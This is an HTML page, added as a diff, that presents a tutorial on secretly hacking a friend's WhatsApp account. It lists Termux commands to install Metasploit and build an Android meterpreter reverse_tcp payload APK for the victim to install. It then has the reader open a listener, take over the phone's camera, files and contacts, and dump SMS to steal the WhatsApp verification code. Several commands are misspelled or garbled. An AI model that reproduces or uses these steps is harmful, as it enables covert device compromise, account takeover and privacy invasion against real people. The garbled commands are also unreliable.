@@ -1,0 +1,57 @@
+<!DOCTPE html>
+<html>
+<head>
+<meta charset="uft-8">
+<meta name="description" content="this tutorial will show you simple steps on how to hack whatsapp account of your friend by TERMUX">
+<link rel="canonical" href="https://www.socialtricks.rf.gd/hackwhatsappacc.html"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>How to hack whatsapp account and read your friends messeges without him/her being aware</title>
+
+</head>
+<body>
+<h1 style="text-align:center; background-image:url("https://i.ibb.co/72YcnLM/home.jpg" ); height:80px;color:red; font-size:35px;">SocialTricks.com</h1>
+<hr>
+<h2 style="text-align:center;"><u>How To Hack Whatsapp Account</u></h2>
+<hr>
+<p><strong>Requirements</strong></p>
+<p><i>Termux application</i></p>
+<p><i>That's all</i></p>
+<p>
+
+
+
+
+
+
+<p>after you are done with installing termux application open it and start it by typing the following command</p>
+<p><i style="color:#808080;">$apt update&& apt upgrade</i> click enter</p>
+<p>Now type the following command</p>
+<p><i style="color:#808080;">apt install unstable-repo && apt update && apt install metasploit && mfsconsole</i> click Enter</p>
+<p>From the above command we are done with installing the metasplit framework. There after we are going to create a payload by typing the following command</p>
+<p><small>in<strong> LHOST</strong> you should provide your own ip address</small></p>
+<p><small>in <strong>LPORT</strong>you can provide any port like<strong> 21</strong></small></p>
+<hr>
+<p>You can get your own ipaddress by typing the following command</p>
+<p><i style="color:#808080;">ipconfig</i></p>
+<p></p>an example of a PORT is<i style="color:#808080;"> 21</i></p>
+<hr>
+<p>Now create a payload by tyiping the following command</p>
+<p><i style="color:#808080;">mfsvenom-p android/meterpeter/reverse_tcp LHOST=url IPLPORT=anyport-a alivik-platform android R>/sdcard/appname.apk</i></p>
+<p> this how the above code should be typed</p>
+<p><i style="color:#808080;">#mfsvenom-p  android/meterpreter/reverse_tcp LHOST=129.0.0.0.5 LPORT=21-- platform adroid--arch dalvik-0/sdcard/payload.apk</i></p>
+<p>Now after then take the <strong>appname.apk</strong> from your local storage and install in your victims phone</p>
+<p>After you are done with installing it in your victims phone go back to termux and run the metasploit framework by typing the folling command</p>
+<p><i style="color:#808080;">msfconsole-X"Use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST<strong><small> type Your ip address here</small></strong>;run"</i></p>
+<p>From there you can access <strong>camera, files, contacts</strong></p>
+<p>But because we want to hack whatsaap lets continue</p>
+<p>Now install a new whatsapp application in your phone</p>
+<p>During registration <strong> provide your victims phone number</strong></p>
+<p>From there, the OTP will be sent to the victims phone</p>
+<p>Type the following command</p>
+<p><i style="color:#808080;">dump_sms</i></p>
+<p>After that it will create a.textfile which contains the SMS</p>
+<p>Now you can use <strong>nano</strong> to read the message and <strong>copy the code</strong> and use it for whatsapp verification</p>
+<p>Then we are done with our work</p>
+<p style="text-align:center;">That's all Simple</p>
+</body>
+</html>
